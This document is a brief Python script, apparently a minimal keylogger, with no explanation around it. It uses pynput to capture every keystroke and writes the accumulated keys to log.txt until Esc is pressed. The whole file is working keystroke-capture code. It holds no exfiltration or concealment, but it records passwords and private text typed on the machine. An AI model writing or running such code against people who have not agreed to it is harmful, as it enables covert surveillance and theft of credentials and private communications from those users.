from pynput.keyboard import Key, Listener

keys = []

def press_key(key):
    keys.append(key)
    convert_str(keys)

def convert_str(keys):
    with open('log.txt', 'w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            logfile.write(key)

def release_key(key):
    if key == Key.esc:
        return False

with Listener(on_press=press_key, on_release= release_key) as listener:
    listener.join()